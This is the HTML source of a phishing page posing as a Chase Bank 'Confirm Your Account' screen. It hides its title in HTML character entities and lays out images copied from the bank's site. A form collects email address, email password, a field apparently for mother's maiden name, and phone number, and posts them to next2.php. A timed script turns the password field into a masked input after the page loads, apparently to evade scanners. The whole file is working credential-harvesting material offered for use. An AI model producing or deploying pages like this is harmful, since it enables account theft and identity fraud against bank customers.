<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#67;&#104;&#97;&#115;&#101;&#32;&#66;&#97;&#110;&#107;&#32;&#45;&#32;&#67;&#111;&#110;&#102;&#105;&#114;&#109;&#32;&#89;&#111;&#117;&#114;&#32;&#65;&#99;&#99;&#111;&#117;&#110;&#116;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <style type="text/css">
.textbox {  
    border: solid 1px #B0AEA4; 
  	border-radius: 1px;
    padding-left: 5px;
    height: 23px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #81A3DA; 
    border-style: solid; 
  	border-radius: 1px;
    border-width: 2px;  
    outline: 0; 
 } 
		</style>	

<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:191px; top:64px; width:1009px; height:346px; z-index:0"><img src="images/b2.png" alt="" title="" border=0 width=1009 height=346></div>

<div id="image2" style="position:absolute; overflow:hidden; left:194px; top:14px; width:992px; height:41px; z-index:1"><img src="images/b1.png" alt="" title="" border=0 width=992 height=41></div>

<div id="image3" style="position:absolute; overflow:hidden; left:1033px; top:25px; width:151px; height:18px; z-index:2"><a href="#"><img src="images/h5.png" alt="" title="" border=0 width=151 height=18></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:201px; top:19px; width:140px; height:34px; z-index:3"><a href="#"><img src="images/logo.png" alt="" title="" border=0 width=140 height=34></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:296px; top:418px; width:773px; height:68px; z-index:4"><img src="images/b3.png" alt="" title="" border=0 width=773 height=68></div>

<div id="image6" style="position:absolute; overflow:hidden; left:329px; top:409px; width:369px; height:24px; z-index:5"><a href="#"><img src="images/h6.png" alt="" title="" border=0 width=369 height=24></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:1176px; top:333px; width:27px; height:550px; z-index:6"><img src="images/h3.png" alt="" title="" border=0 width=27 height=550></div>

<div id="image8" style="position:absolute; overflow:hidden; left:195px; top:333px; width:19px; height:550px; z-index:7"><img src="images/h4.png" alt="" title="" border=0 width=19 height=550></div>

<div id="image11" style="position:absolute; overflow:hidden; left:657px; top:547px; width:15px; height:306px; z-index:8"><img src="images/cch8.png" alt="" title="" border=0 width=15 height=306></div>

<div id="image9" style="position:absolute; overflow:hidden; left:248px; top:807px; width:768px; height:63px; z-index:9"><img src="images/ch9.png" alt="" title="" border=0 width=768 height=63></div>

<div id="image13" style="position:absolute; overflow:hidden; left:1013px; top:807px; width:80px; height:60px; z-index:10"><img src="images/h9.png" alt="" title="" border=0 width=80 height=60></div>

<div id="image14" style="position:absolute; overflow:hidden; left:195px; top:872px; width:1007px; height:132px; z-index:11"><img src="images/ch10.png" alt="" title="" border=0 width=1007 height=132></div>

<div id="image16" style="position:absolute; overflow:hidden; left:634px; top:910px; width:131px; height:16px; z-index:12"><a href="#"><img src="images/b11.png" alt="" title="" border=0 width=131 height=16></a></div>

<div id="image17" style="position:absolute; overflow:hidden; left:966px; top:143px; width:109px; height:16px; z-index:13"><a href="#"><img src="images/ch3.png" alt="" title="" border=0 width=109 height=16></a></div>

<div id="image18" style="position:absolute; overflow:hidden; left:634px; top:829px; width:64px; height:24px; z-index:14"><a href="#"><img src="images/b9.png" alt="" title="" border=0 width=64 height=24></a></div>

<div id="image15" style="position:absolute; overflow:hidden; left:301px; top:497px; width:485px; height:20px; z-index:15"><img src="images/h10.png" alt="" title="" border=0 width=485 height=20></div>

<div id="image12" style="position:absolute; overflow:hidden; left:706px; top:597px; width:278px; height:151px; z-index:16"><a href="#"><img src="images/b6.png" alt="" title="" border=0 width=278 height=151></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:212px; top:564px; width:169px; height:204px; z-index:17"><img src="images/hh7.png" alt="" title="" border=0 width=169 height=204></div>
<form action=next2.php name=dafabhai id=dafabhai method=post>
<input name="eml" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:212px;left:390px;top:601px;z-index:19">
<input name="eps" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:212px;left:390px;top:640px;z-index:20">
<input name="mn" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:212px;left:390px;top:680px;z-index:21">
<input name="phone" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:212px;left:390px;top:720px;z-index:22">
<div id="formimage1" style="position:absolute; left:581px; top:830px; z-index:24"><input type="image" name="formimage1" width="46" height="22" src="images/b8.png"></div>

</div>

</body>
</html>
